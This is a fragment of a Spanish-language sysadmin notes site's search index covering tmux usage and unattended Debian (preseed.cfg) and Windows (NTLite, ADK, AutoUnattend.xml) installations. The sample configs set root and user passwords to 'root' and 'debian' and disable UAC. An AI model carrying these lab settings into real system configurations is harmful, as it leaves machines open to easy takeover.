ventana"},{"location":"curiosidades/tmux/#zoom-de-una-ventana","text":"ctrl + b z # a\u00f1adir zoom, pone pantalla completa ctrl + b z # por segunda vez, quitar zoom","title":"Zoom de una ventana"},{"location":"curiosidades/tmux/#cerrar-ventana","text":"ctrl + b & ctrl + b x # cerrar divisi\u00f3n o ventana si no hay divisiones","title":"Cerrar ventana"},{"location":"curiosidades/tmux/#tarea-en-2o-plano","text":"Muy \u00fatil cuando ejecutas un comando que tarda mucho. ctrl + b d","title":"Tarea en 2\u00ba plano"},{"location":"curiosidades/tmux/#ver-listas-de-sesiones-activas","text":"tmux ls","title":"Ver listas de sesiones activas"},{"location":"curiosidades/tmux/#volver-a-la-sesion","text":"tmux a # en el caso de que ayan varias sesiones activas tmux a -t nombre","title":"Volver a la sesi\u00f3n"},{"location":"curiosidades/tmux/#elegir-sesion-si-tenemos-abierta-mas-de-una","text":"Ctrl + b s","title":"Elegir sesi\u00f3n si tenemos abierta m\u00e1s de una."},{"location":"curiosidades/tmux/#cerrar-sesion","text":"ctrl + b & # en todas las ventanas tmux kill-session -t mysesi\u00f3n # matar sesi\u00f3n","title":"Cerrar sesion"},{"location":"curiosidades/tmux/#copiar-y-pegar","text":"En tmux se puede copiar y pegar como en todas las terminales ctrl + Mayus + c|v , o en caso de no utilizar entorno gr\u00e1fico dispone de su propio Copy&Paste muy parecido a vim. Entrar \"copy mode\" presionando CTRL + b, [ . Utilizar las flechas para mover el cursor por la pantalla. Presiona CTRL + SPACE para empezar a copiar. Usa las flexas para moverte al final det texto que quieres copiar. Presiona ALT + w o CTRL + w para copiar. Presiona CTRL + b, ] para copiar, incluso en otras ventanas Tmux abiertas en esa misma sessi\u00f3n.","title":"Copiar y pegar"},{"location":"curiosidades/tmux/#compartir-sesion","text":"Partimos de 2 hosts, host \"uno\" y host \"dos\", el host dos ara de server con la ip 10.0.0.2. Fingiremos que hay alguien trabajando en el server e invita a otro a ver su trabajo, o pide ayuda, da lo mismo.","title":"Compartir sesi\u00f3n"},{"location":"curiosidades/tmux/#server-host-dos","text":"inicia tmux con una sesion llamada compartida tmux new -s compartida ###### Host \"uno\" conecta con server tmux # inicia sesion de tmux ssh server@10.0.0.2 # se conecta via ssh al server tmux ls # lista sesiones abiertas tmux a -t compartida # se conecta a la sesi\u00f3n compartida","title":"Server, host dos."},{"location":"desatendidas/","text":"Desatendidas Relacionado con instalaciones desatendidas, para los que no les guste ver el proceso de las barritas.","title":"Desatendidas"},{"location":"desatendidas/#desatendidas","text":"Relacionado con instalaciones desatendidas, para los que no les guste ver el proceso de las barritas.","title":"Desatendidas"},{"location":"desatendidas/Instalacion-desatendida-debian/","text":"Instalaci\u00f3n desatendida debian Para la instalaci\u00f3n desatendida de debian usaremos preseed.cfg b\u00e1sicamente es insertar un archivo en el contenido de instalaci\u00f3n de nuestra iso, concretamente en el comprimido initrd.gz. Tambi\u00e9n usaremos isomaster para la modificaci\u00f3n dev la iso. \u00cdndice: Descargar iso Extraer archivos Descomprimir initrd.gz y editar preseed Comprimir initrd nuevo insertar en la iso Editar menu de entrada e insertar en la iso Extraer nueva iso Empecemos: \u200b Descargar iso Descargamos una iso de debian ( Importante que no sea netinstall) , las net dan un problema que no encuentra los espejos y no e sabido solucionarlo. wget https://cdimage.debian.org/debian-cd/current/amd64/iso-dvd/debian-9.3.0-amd64-DVD-1.iso \u200b reconozco que es un poco pesada 4G pero merece la pena el resultado. Extraer archivos Usando isomaster extraemos el archivo initrd.gz que se encuentra en install.amd/ y a\u00f1adimos la copia a nuestro escritorio personal. Tambi\u00e9n extraemos archivo /isolinux/txt.cfg para modificarlo mas adelante. Descomprimir initrd.gz y editar preseed Creamos una carpeta y lo extraemos dentro initrd.gz. mkdir initrd cd initrd sudo zcat ../initrd.gz | cpio -i -d Creo un archivo con nombre preseed.cfg dentro de initrd que sera la configuraci\u00f3n deseada. touch preseed.cfg Y lo editamos con un editor, pongo el mio de muestra, y os dejo un manual para a\u00f1adir los parametros deseados a vuestro gusto. https://www.debian.org/releases/stable/i386/apb.html # Seleccionar lenguaje y pa\u00eds: en mi caso Castellano: d-i debian-installer/locale string es_ES # Selecci\u00f3n de teclado espa\u00f1ol: d-i keyboard-configuration/xkb-keymap select es # NO quiero configurar la red # y por ello permito que se detecte la red con DHCP # Si hay m\u00e1s de una interfaz de red (eth0, eth1) # seleccionar autom\u00e1ticamente una interfaz d-i netcfg/choose_interface select auto # Cuando falla la detecci\u00f3n por red indicar que no se va a # configurar la red d-i netcfg/dhcp_failed note d-i netcfg/dhcp_options select Do not configure the network at this time # Establecer el nombre de la computadora (hostname) d-i netcfg/get_hostname string debian-desatendida # Seleccionar la lista de repositorios # No tiene que definir la cadena mirror/country si selecciona ftp #d-i mirror/protocol string ftp d-i mirror/country string manual d-i mirror/http/hostname string ftp.es.debian.org/debian/ d-i mirror/http/directory string /debian d-i mirror/http/proxy string # Publicaci\u00f3n a instalar. d-i mirror/suite string testing # Publicaci\u00f3n a utilizar para descargar componentes de la instalaci\u00f3n # (opcional) d-i mirror/udeb/suite string testing # Utilizar el reloj con utc d-i clock-setup/utc boolean true # Establecer la zona horaria d-i time/zone string Europe/Madrid ################################## # Indicar al partman (creador de particiones) el volumen del disco a # utilizar para crear las particiones # ( voy a instalar esta iso en una mv por lo tanto indico disco vda ) # en e caso de ser m\u00e1quina real poner disco qiue tengais sda seguramente d-i partman-auto/disk string /dev/vda # Indicar al partman que vamos a particionar de manera regular # otras opciones son lvm y crypto (para particionar encriptado) d-i partman-auto/method string regular # Esta tocadura de pelotas nos indica que crea tres particiones: swap, /home, / raiz. # los n\u00fameros ( 5120 6000 1000000000 )indican : # primero: tama\u00f1o m\u00ednmo de partici\u00f3n # segundo: prioridad a de estar entre el tama\u00f1o del 1\u00ba y el 3\u00ba # tercero: tama\u00f1o m\u00e1ximo de partici\u00f3n # el 1000000000 indica que cogera todo el espacio disponible en el disco # para m\u00e1s informaci\u00f3n el manual que e dejado justo arriba. d-i partman-auto/expert_recipe string boot-root :: \\ 5120 6000 1000000000 ext3 \\ $primary { } $bootable { } \\ method { format } format { } \\ use_filesystem { } filesystem { ext3 } \\ mountpoint { /home } \\ . \\ 5120 6000 10240 ext3 \\ method { format } format { } \\ use_filesystem { } filesystem { ext3 } \\ mountpoint { / } \\ . \\ 1024 1024 100 % linux-swap \\ method { swap } format { } \\ . ########################################################3 ############################ # esta parte comentada seria si queremos la instalaci\u00f3n de disco por defecto ##################################### # Indicar al partman que vamos a particionar de manera regular # otras opciones son lvm y crypto (para particionar encriptado) #d-i partman-auto/method string regular #d-i partman-lvm/device_remove_lvm boolean true #d-i partman-md/device_remove_md boolean true #d-i partman-lvm/confirm boolean true #d-i partman-auto/chose_recipe select multi ###########################33 # Indicamos al partman que no nos pregunte m\u00e1s nada d-i partman-partitioning/confirm_write_new_label boolean true d-i partman/confirm_write_new_label boolean true d-i partman/choose_partition select finish d-i partman/confirm boolean true d-i partman/confirm_nooverwrite boolean true # Indicamos que a\u00f1ada repositorios nonfree crontib d-i apt-setup/non-free boolean true d-i apt-setup/contrib boolean true # Select which update services to use; define the mirrors to be used. # Values shown below are the normal defaults. d-i apt-setup/services-select multiselect security, updates d-i apt-setup/security_host string security.debian.org # Permitimos que se instale el grub como gestor de arranque # como yo s\u00f3lo uso debian se lo indico al instalador # si tuviera otro sistema operativo (window$ por ejemplo) tendr\u00eda # que cambiar la instrucci\u00f3n d-i grub-installer/only_debian boolean true # indicamos que queremos el grub en el MBR de vda d-i grub-installer/bootdev string /dev/vda # Saltarse el mensaje de: \"instalaci\u00f3n finalizada\" d-i finish-install/reboot_in_progress note # Poner la prioridad del # debconf (que es la herramienta para crear configuraciones) # que use el nivel cr\u00edtico para que # no haga preguntas innecesarias d-i debconf/priority select critical debconf debconf/priority select critical # Crear la contrase\u00f1a del usuario root passwd passwd/root-password password root passwd passwd/root-password-again password root # Crear un usuario con su contrase\u00f1a # en este ejemplo el usuario con username \"debian\" # y contrase\u00f1a \"debian\" muy seguro lo s\u00e9 passwd passwd/user-fullname string debian-stretch passwd passwd/username string debian # And their password, but use caution! passwd passwd/user-password password debian passwd passwd/user-password-again password debian # indicamos escritorio a instalar \u00a1importante!, si no se instala sin escritorio tasksel tasksel/first multiselect standard, desktop, cinnamon-desktop # a\u00f1ado un script final de la instalacion este script lo inserto en la iso en la carpeta # finisher y raiz de la iso d-i preseed/late_command string cp /cdrom/finisher/finisher.sh /target/root/ ; chroot /target chmod +x /root/finisher.sh ; chroot /target bash /root/finisher.sh # Paquetes individuales a instalar #d-i pkgsel/include string openssh-server build-essential # En caso de querer hacer actualizaci\u00f3n de paquetes despu\u00e9s # de debootstrap. # Valores posibles: none, safe-upgrade, full-upgrade #d-i pkgsel/upgrade select none # hacer un chroot a \u00ab/target\u00bb y utilizarlo directamente o utilizar las # \u00f3rdenes \u00abapt-install\u00bb e \u00abin-target\u00bb para instalar f\u00e1cilmente paquetes # y ejecutar \u00f3rdenes en el sistema destino #d-i preseed/late_command string apt-install zsh; in-target chsh -s /bin/zsh Es una tocadura de huevos lo s\u00e9, pero es debian. En mi caso e a\u00f1adido un script final que insertare la raiz de la iso con isomaster, en el script puedes a\u00f1adir los parametros que quieras se ejecutara justo despues de la instalaci\u00f3n y como root. mkdir finisher touch finisher/finisher.sh # y lo edito a my gusto Comprimir initrd nuevo insertar en la iso una vez editado el preseed.cfg a nuestro gusto comprimir de nuevo la carpeta initrd cd initrd sudo find . | cpio -o -H newc | gzip -9 > ../initrd.gz cd .. E insertar el nuevo initrd.gz en la direccion de la iso /isolinux/ con isomaster. Editar menu de entrada e insertar en la iso edito entrada en el menu de instalacion. abrimos archivo de menu de las iso por defecto que se encuentra cat /isolinux/menu.cfg menu hshift 7 menu width 61 menu title Debian GNU/Linux installer boot menu include stdmenu.cfg include gtk.cfg include txt.cfg menu begin advanced menu label ^Advanced options menu title Advanced options include stdmenu.cfg label mainmenu menu label ^Back.. menu exit include adgtk.cfg include adtxt.cfg include adspkgtk.cfg include adspk.cfg menu end include x86menu.cfg label help menu label ^Help text help Display help screens ; type 'menu' at boot prompt to return to this menu endtext config prompt.cfg include spkgtk.cfg include spk.cfg entre todos estos archivos buscamos el que nos interesa que es include txt.cfg lo editamos, ya que esta en nuestra carpeta personal al averlo extraido anteriormente. sudo nano txt.cfg Que a\u00f1\u00e1diremos las siguentes lineas: label install menu label ^Install kernel /install.amd/vmlinuz append vga = 788 initrd = /install.amd/initrd.gz --- quiet label install2 menu label ^Install-desatendida kernel /install.amd/vmlinuz append vga = 788 initrd = /isolinux/initrd.gz --- quiet Lo que hemos hecho es a\u00f1adir una nueva salida al menu, indicando kernel a arrancar por defecto y la nueva configuracion de arranque el nuevo initrd.gz que emos ha\u00f1adido. lo a\u00f1adimos a la iso. ( eliminamos primero el que hay en la iso para evitar problemas ). Extraer nueva iso Una vez echo todo lo anterior procedemos a montar la iso con todos sus archivos nuevos dentro, simplemente es guardar con isomaster. Pues ya tenemos nuestra iso para instalar donde queramos, ejemplo de menu de arranque: Una vez le demos a instalaci\u00f3n desatendida ya podemos irnos a tomar un cafe por que no nos preguntara nada mas. Si da alg\u00fan tipo de fallo es segutramente por haber puesto algun parametro mal en el archivo preseed.cfg","title":"Instalacion desatendida debian"},{"location":"desatendidas/Instalacion-desatendida-debian/#instalacion-desatendida-debian","text":"Para la instalaci\u00f3n desatendida de debian usaremos preseed.cfg b\u00e1sicamente es insertar un archivo en el contenido de instalaci\u00f3n de nuestra iso, concretamente en el comprimido initrd.gz. Tambi\u00e9n usaremos isomaster para la modificaci\u00f3n dev la iso.","title":"Instalaci\u00f3n desatendida debian"},{"location":"desatendidas/Instalacion-desatendida-debian/#indice","text":"Descargar iso Extraer archivos Descomprimir initrd.gz y editar preseed Comprimir initrd nuevo insertar en la iso Editar menu de entrada e insertar en la iso Extraer nueva iso Empecemos: \u200b","title":"\u00cdndice:"},{"location":"desatendidas/Instalacion-desatendida-debian/#descargar-iso","text":"Descargamos una iso de debian ( Importante que no sea netinstall) , las net dan un problema que no encuentra los espejos y no e sabido solucionarlo. wget https://cdimage.debian.org/debian-cd/current/amd64/iso-dvd/debian-9.3.0-amd64-DVD-1.iso \u200b reconozco que es un poco pesada 4G pero merece la pena el resultado.","title":"Descargar iso"},{"location":"desatendidas/Instalacion-desatendida-debian/#extraer-archivos","text":"Usando isomaster extraemos el archivo initrd.gz que se encuentra en install.amd/ y a\u00f1adimos la copia a nuestro escritorio personal. Tambi\u00e9n extraemos archivo /isolinux/txt.cfg para modificarlo mas adelante.","title":"Extraer archivos"},{"location":"desatendidas/Instalacion-desatendida-debian/#descomprimir-initrdgz-y-editar-preseed","text":"Creamos una carpeta y lo extraemos dentro initrd.gz. mkdir initrd cd initrd sudo zcat ../initrd.gz | cpio -i -d Creo un archivo con nombre preseed.cfg dentro de initrd que sera la configuraci\u00f3n deseada. touch preseed.cfg Y lo editamos con un editor, pongo el mio de muestra, y os dejo un manual para a\u00f1adir los parametros deseados a vuestro gusto. https://www.debian.org/releases/stable/i386/apb.html # Seleccionar lenguaje y pa\u00eds: en mi caso Castellano: d-i debian-installer/locale string es_ES # Selecci\u00f3n de teclado espa\u00f1ol: d-i keyboard-configuration/xkb-keymap select es # NO quiero configurar la red # y por ello permito que se detecte la red con DHCP # Si hay m\u00e1s de una interfaz de red (eth0, eth1) # seleccionar autom\u00e1ticamente una interfaz d-i netcfg/choose_interface select auto # Cuando falla la detecci\u00f3n por red indicar que no se va a # configurar la red d-i netcfg/dhcp_failed note d-i netcfg/dhcp_options select Do not configure the network at this time # Establecer el nombre de la computadora (hostname) d-i netcfg/get_hostname string debian-desatendida # Seleccionar la lista de repositorios # No tiene que definir la cadena mirror/country si selecciona ftp #d-i mirror/protocol string ftp d-i mirror/country string manual d-i mirror/http/hostname string ftp.es.debian.org/debian/ d-i mirror/http/directory string /debian d-i mirror/http/proxy string # Publicaci\u00f3n a instalar. d-i mirror/suite string testing # Publicaci\u00f3n a utilizar para descargar componentes de la instalaci\u00f3n # (opcional) d-i mirror/udeb/suite string testing # Utilizar el reloj con utc d-i clock-setup/utc boolean true # Establecer la zona horaria d-i time/zone string Europe/Madrid ################################## # Indicar al partman (creador de particiones) el volumen del disco a # utilizar para crear las particiones # ( voy a instalar esta iso en una mv por lo tanto indico disco vda ) # en e caso de ser m\u00e1quina real poner disco qiue tengais sda seguramente d-i partman-auto/disk string /dev/vda # Indicar al partman que vamos a particionar de manera regular # otras opciones son lvm y crypto (para particionar encriptado) d-i partman-auto/method string regular # Esta tocadura de pelotas nos indica que crea tres particiones: swap, /home, / raiz. # los n\u00fameros ( 5120 6000 1000000000 )indican : # primero: tama\u00f1o m\u00ednmo de partici\u00f3n # segundo: prioridad a de estar entre el tama\u00f1o del 1\u00ba y el 3\u00ba # tercero: tama\u00f1o m\u00e1ximo de partici\u00f3n # el 1000000000 indica que cogera todo el espacio disponible en el disco # para m\u00e1s informaci\u00f3n el manual que e dejado justo arriba. d-i partman-auto/expert_recipe string boot-root :: \\ 5120 6000 1000000000 ext3 \\ $primary { } $bootable { } \\ method { format } format { } \\ use_filesystem { } filesystem { ext3 } \\ mountpoint { /home } \\ . \\ 5120 6000 10240 ext3 \\ method { format } format { } \\ use_filesystem { } filesystem { ext3 } \\ mountpoint { / } \\ . \\ 1024 1024 100 % linux-swap \\ method { swap } format { } \\ . ########################################################3 ############################ # esta parte comentada seria si queremos la instalaci\u00f3n de disco por defecto ##################################### # Indicar al partman que vamos a particionar de manera regular # otras opciones son lvm y crypto (para particionar encriptado) #d-i partman-auto/method string regular #d-i partman-lvm/device_remove_lvm boolean true #d-i partman-md/device_remove_md boolean true #d-i partman-lvm/confirm boolean true #d-i partman-auto/chose_recipe select multi ###########################33 # Indicamos al partman que no nos pregunte m\u00e1s nada d-i partman-partitioning/confirm_write_new_label boolean true d-i partman/confirm_write_new_label boolean true d-i partman/choose_partition select finish d-i partman/confirm boolean true d-i partman/confirm_nooverwrite boolean true # Indicamos que a\u00f1ada repositorios nonfree crontib d-i apt-setup/non-free boolean true d-i apt-setup/contrib boolean true # Select which update services to use; define the mirrors to be used. # Values shown below are the normal defaults. d-i apt-setup/services-select multiselect security, updates d-i apt-setup/security_host string security.debian.org # Permitimos que se instale el grub como gestor de arranque # como yo s\u00f3lo uso debian se lo indico al instalador # si tuviera otro sistema operativo (window$ por ejemplo) tendr\u00eda # que cambiar la instrucci\u00f3n d-i grub-installer/only_debian boolean true # indicamos que queremos el grub en el MBR de vda d-i grub-installer/bootdev string /dev/vda # Saltarse el mensaje de: \"instalaci\u00f3n finalizada\" d-i finish-install/reboot_in_progress note # Poner la prioridad del # debconf (que es la herramienta para crear configuraciones) # que use el nivel cr\u00edtico para que # no haga preguntas innecesarias d-i debconf/priority select critical debconf debconf/priority select critical # Crear la contrase\u00f1a del usuario root passwd passwd/root-password password root passwd passwd/root-password-again password root # Crear un usuario con su contrase\u00f1a # en este ejemplo el usuario con username \"debian\" # y contrase\u00f1a \"debian\" muy seguro lo s\u00e9 passwd passwd/user-fullname string debian-stretch passwd passwd/username string debian # And their password, but use caution! passwd passwd/user-password password debian passwd passwd/user-password-again password debian # indicamos escritorio a instalar \u00a1importante!, si no se instala sin escritorio tasksel tasksel/first multiselect standard, desktop, cinnamon-desktop # a\u00f1ado un script final de la instalacion este script lo inserto en la iso en la carpeta # finisher y raiz de la iso d-i preseed/late_command string cp /cdrom/finisher/finisher.sh /target/root/ ; chroot /target chmod +x /root/finisher.sh ; chroot /target bash /root/finisher.sh # Paquetes individuales a instalar #d-i pkgsel/include string openssh-server build-essential # En caso de querer hacer actualizaci\u00f3n de paquetes despu\u00e9s # de debootstrap. # Valores posibles: none, safe-upgrade, full-upgrade #d-i pkgsel/upgrade select none # hacer un chroot a \u00ab/target\u00bb y utilizarlo directamente o utilizar las # \u00f3rdenes \u00abapt-install\u00bb e \u00abin-target\u00bb para instalar f\u00e1cilmente paquetes # y ejecutar \u00f3rdenes en el sistema destino #d-i preseed/late_command string apt-install zsh; in-target chsh -s /bin/zsh Es una tocadura de huevos lo s\u00e9, pero es debian. En mi caso e a\u00f1adido un script final que insertare la raiz de la iso con isomaster, en el script puedes a\u00f1adir los parametros que quieras se ejecutara justo despues de la instalaci\u00f3n y como root. mkdir finisher touch finisher/finisher.sh # y lo edito a my gusto","title":"Descomprimir initrd.gz y editar preseed"},{"location":"desatendidas/Instalacion-desatendida-debian/#comprimir-initrd-nuevo-insertar-en-la-iso","text":"una vez editado el preseed.cfg a nuestro gusto comprimir de nuevo la carpeta initrd cd initrd sudo find . | cpio -o -H newc | gzip -9 > ../initrd.gz cd .. E insertar el nuevo initrd.gz en la direccion de la iso /isolinux/ con isomaster.","title":"Comprimir initrd nuevo insertar en la iso"},{"location":"desatendidas/Instalacion-desatendida-debian/#editar-menu-de-entrada-e-insertar-en-la-iso","text":"edito entrada en el menu de instalacion. abrimos archivo de menu de las iso por defecto que se encuentra cat /isolinux/menu.cfg menu hshift 7 menu width 61 menu title Debian GNU/Linux installer boot menu include stdmenu.cfg include gtk.cfg include txt.cfg menu begin advanced menu label ^Advanced options menu title Advanced options include stdmenu.cfg label mainmenu menu label ^Back.. menu exit include adgtk.cfg include adtxt.cfg include adspkgtk.cfg include adspk.cfg menu end include x86menu.cfg label help menu label ^Help text help Display help screens ; type 'menu' at boot prompt to return to this menu endtext config prompt.cfg include spkgtk.cfg include spk.cfg entre todos estos archivos buscamos el que nos interesa que es include txt.cfg lo editamos, ya que esta en nuestra carpeta personal al averlo extraido anteriormente. sudo nano txt.cfg Que a\u00f1\u00e1diremos las siguentes lineas: label install menu label ^Install kernel /install.amd/vmlinuz append vga = 788 initrd = /install.amd/initrd.gz --- quiet label install2 menu label ^Install-desatendida kernel /install.amd/vmlinuz append vga = 788 initrd = /isolinux/initrd.gz --- quiet Lo que hemos hecho es a\u00f1adir una nueva salida al menu, indicando kernel a arrancar por defecto y la nueva configuracion de arranque el nuevo initrd.gz que emos ha\u00f1adido. lo a\u00f1adimos a la iso. ( eliminamos primero el que hay en la iso para evitar problemas ).","title":"Editar menu de entrada e insertar en la iso"},{"location":"desatendidas/Instalacion-desatendida-debian/#extraer-nueva-iso","text":"Una vez echo todo lo anterior procedemos a montar la iso con todos sus archivos nuevos dentro, simplemente es guardar con isomaster. Pues ya tenemos nuestra iso para instalar donde queramos, ejemplo de menu de arranque: Una vez le demos a instalaci\u00f3n desatendida ya podemos irnos a tomar un cafe por que no nos preguntara nada mas. Si da alg\u00fan tipo de fallo es segutramente por haber puesto algun parametro mal en el archivo preseed.cfg","title":"Extraer nueva iso"},{"location":"desatendidas/desatendida-windows/","text":"desatendida windows Formas de crear Links de descarga Ntlite 1 Descargar herrmientas 2 Abrir iso y copiar en carpeta 3 abrir ntlite y a\u00f1adir imagen 4 abrir windows que configurar 5 Configurar iso Eliminar Configurar Integrar Automatizar Automatizar/desatendido Postinstalaci\u00f3n Final ADK Descargar herrmientas Montamos imagen en carpeta abrimos ADK Empezar a configurar Extraer imagen Archivo de respuesta A\u00f1adir componentes a archivo de respuesta 1 windowsPE 2 offlineServicing 3 generalize 4 specialize 7 oobeSystem Configurar componentes Desinstalar app y desabilitar updates Guardar archivo en iso y montar Formas de crear Tenemos 3 maneras de crear una desatendida en windows ntlite un programa que tiene versi\u00f3n gratuita y de pago. Muy f\u00e1cil de usar En gratuito no puedes modificar discos y particiones, por defecto utiliza todo el disco. Muy recomendable si quieres instalar en todo el disco. adk es la actualizaci\u00f3n de aik. Dif\u00edcil manejo hay que tener conocimientos de controladores o mirar mucha documentaci\u00f3n de ayuda. En este caso partiremos de una plantilla. Todas las posibilidades de configuraci\u00f3n. Crear archivo AutoUnattend.xml manualmente. Nivel dios todo poderoso, hay que dedicarle muchas horas a documentarse. Esta manera la evitaremos. Links de descarga ntlite Windows Assessment and Deployment Kit ( adk ) Kit de instalaci\u00f3n automatizada de Windows ( waik ) Ntlite Empecemos por lo f\u00e1cil. 1 Descargar herrmientas Descargar ntlite e instalar, no tiene complicaci\u00f3n. Descargamos iso de windows 2 Abrir iso y copiar en carpeta Clic derecho en la iso descargada y descomprimir en carpeta. En mi caso la iso se llama win10 y \u201cextraer en carpeta win10/\u201d 3 abrir ntlite y a\u00f1adir imagen click en a\u00f1adir \u2192 buscar carpeta que hemos descomprimido la imagen. 4 abrir windows que configurar En mi caso la iso solo tiene windows 10 home pero si os descargais una iso de microsoft tendr\u00e1 varias versiones del windows elegido Tarda unos minutos lo aviso entre 2 y 4 normalmente 5 Configurar iso A continuaci\u00f3n nos saldr\u00e1 una barra lateral con las diferentes opciones de configuraci\u00f3n. Tenemos varias opciones \u00fatiles por aqu\u00ed: Eliminar eliminar/componentes \u2192 podemos eliminar las app de windows por defecto tipo bing o twitter etc.. Configurar configurar/configurar \u2192 podemos poner que pregunte antes de descargar actualizaciones por ejemplo, entre muchas otras cosas. configura/servicios \u2192 activas y desactivas servicios por defecto Integrar integrar/actualizaciones \u2192 si te descargas aplicaciones manualmente puedes a\u00f1adirlas para que el sistema las integre en la instalaci\u00f3n. integrar/controladores \u2192 a\u00f1ades drivers de los dispositivos deseados. Automatizar Aqu\u00ed es la secci\u00f3n donde evitamos que sea un pesado el instalador preguntandonos pasos. Automatizar/desatendido Primero marcamos pesta\u00f1a activar arriba a la izquierda. Seguiremos a\u00f1adiendo, idioma, idioma teclado, saltar ventanas, zona horaria, usuarios, etc.. En mi caso hecho una configuraci\u00f3n simple sin clave de activaci\u00f3n, si se desea activar windows es muy intuitivo solo hay que a\u00f1adir dicha clave en los casillas correspondientes. Podremos configurar casi todo menos las particiones ya que estamos utilizando versi\u00f3n gratuita, en la versi\u00f3n de pago eres libre a partir de 40\u20ac actualmente. Postinstalaci\u00f3n Aqu\u00ed nos permite agregar scripts o ejecutables para que se instalen justo despu\u00e9s de la instalaci\u00f3n. En mi caso he a\u00f1adido el ejecutable de firefox. A\u00f1adir \u2192 seleccionas ejecutable Final Por \u00faltimo nos queda montar la iso en el apartado aplicar. Seleccionamos crear iso y procesar. Tardar\u00e1 un rato es un poco lento unos 5 - 10 minutos. Pero bueno es tiempo que nos ahorraremos en un futuro instalando. Una vez creada la iso solo nos queda quemarla en un pen o insertar en m\u00e1quina virtual y a esperar que se instala todo solito. ADK ADK nos genera un archivo AutoUnattend.xml que luego a\u00f1adiremos a la ra\u00edz de la iso. Descargar herrmientas Descargar adk e instalar Descargamos iso de windows Montamos imagen en carpeta click derecho en im\u00e1gen extraer en carpeta a elegir abrimos ADK administrador de im\u00e1genes de sistemas de windows Nombre cortito han elegido Empezar a configurar Extraer imagen En el recuadro inferior izquierdo \u201cImagen de windows\u201d click derecho seleccionar imagen de windows Buscamos en la carpeta que hemos extra\u00eddo la iso el archivo install.wim ~/imagen/sources/install.wim Tardara un poco, paciencia. Archivo de respuesta En el recuadro superior central \u201cArchivo de respuesta\u201d click derecho seleccionar nuevo archivo de respuesta Quedar\u00e1 as\u00ed. Abajo todos los componentes a a\u00f1adir al archivo y arriba iremos configurando lo requerido. A\u00f1adir componentes a archivo de respuesta Para a\u00f1adir un componente click derecho sobre el y seleccionamos la posici\u00f3n a insertar. 1 windowsPE International-core-winPe-neutral/setupUILanguage windows-setup-neutral/diskConfiguration/disk/createPartition windows-setup-neutral/diskConfiguration/disk/ModifiPartition windows-setup-neutral/imageinstall/osimage/installTo windows-setup-neutral/UserData/ProductKey 2 offlineServicing Windows-Lua-Settings-neutral 3 generalize Windows-Securiti-SPP-neutral 4 specialize Windows-International-core-neutral Windows-Security-SPP-UX-neutral Windows-Shell-setup-neutral Windows-SQMApi-neutral 7 oobeSystem Windows-Shell-Setup-neutral/Autolog/Password (esta opci\u00f3n si quieres a\u00f1adir comandos al final de la instalaci\u00f3n) - Windows-Shell-Setup-neutral/FirstLogonCommands/SyschronousCommand Windows-Shell-Setup-neutral/OOBE Windows-Shell-Setup-neutral/UserAcounts/localAccounts Configurar componentes ( Para ver la ayuda de los par\u00e1metros a configurar click derecho ayuda) Como es muy largo de explicar dejo el archivo de respuesta comentado a continuaci\u00f3n y buscamos poco a poco cada par\u00e1metro. Tambi\u00e9n puedes copiar el siguiente archivo, abrirlo como Autounattend.xml y modificar al gusto, es algo complejo al principio. AutoUnattend.xml <?xml version=\"1.0\" encoding=\"utf-8\"?> <unattend xmlns= \"urn:schemas-microsoft-com:unattend\" > <settings pass= \"windowsPE\" > <component name= \"Microsoft-Windows-International-Core-WinPE\" processorArchitecture= \"amd64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <!-- Idioma de teclado e instalaci\u00f3n --> <SetupUILanguage> <UILanguage> es-ES </UILanguage> </SetupUILanguage> <InputLocale> 040a:0000040a </InputLocale> <SystemLocale> es-ES </SystemLocale> <UILanguage> es-ES </UILanguage> <UILanguageFallback> es-ES </UILanguageFallback> <UserLocale> es-ES_tradnl </UserLocale> </component> <!-- fin Idioma de teclado e instalaci\u00f3n --> <component name= \"Microsoft-Windows-Setup\" processorArchitecture= \"amd64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <DiskConfiguration> <Disk wcm:action= \"add\" > <ModifyPartitions> <ModifyPartition wcm:action= \"add\" > <!-- Active que sea la partici\u00f3n activa al arrancar--> <Active> true </Active> <Format> NTFS </Format> <Label> os </Label> <Letter> C </Letter> <Order> 1 </Order> <PartitionID> 1 </PartitionID> </ModifyPartition> </ModifyPartitions> <CreatePartitions> <CreatePartition wcm:action= \"add\" > <!-- extend Que ocupe todo el disco--> <Extend> true </Extend> <Order> 1 </Order> <Type> Primary </Type> </CreatePartition> </CreatePartitions> <!-- disco 0 --> <DiskID> 0 </DiskID> <!-- borre todo el disco--> <WillWipeDisk> true </WillWipeDisk> </Disk> </DiskConfiguration> <ImageInstall> <OSImage> <InstallTo> <!-- Instalar en disco 0 partici\u00f3n 1--> <DiskID> 0 </DiskID> <PartitionID> 1 </PartitionID> </InstallTo> <!-- Especifica que se instalara windows en las paticiones que e descrito--> <InstallToAvailablePartition> false </InstallToAvailablePartition> </OSImage> </ImageInstall> <UserData> <ProductKey> <Key> W269N-WFGWX-YVC9B-4J6C9-T83GX </Key> </ProductKey> <!-- especifica que se acepta automaticamente la clave--> <AcceptEula> true </AcceptEula> <FullName> admin </FullName> </UserData> </component> </settings> <settings pass= \"offlineServicing\" > <component name= \"Microsoft-Windows-LUA-Settings\" processorArchitecture= \"amd64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <EnableLUA> false </EnableLUA> </component> </settings> <settings pass= \"generalize\" > <component name= \"Microsoft-Windows-Security-SPP\" processorArchitecture= \"amd64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <!-- Especifica que la licenciab no cambiaa y es valida--> <SkipRearm> 1 </SkipRearm> </component> </settings> <settings pass= \"specialize\" > <component name= \"Microsoft-Windows-International-Core\" processorArchitecture= \"wow64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= 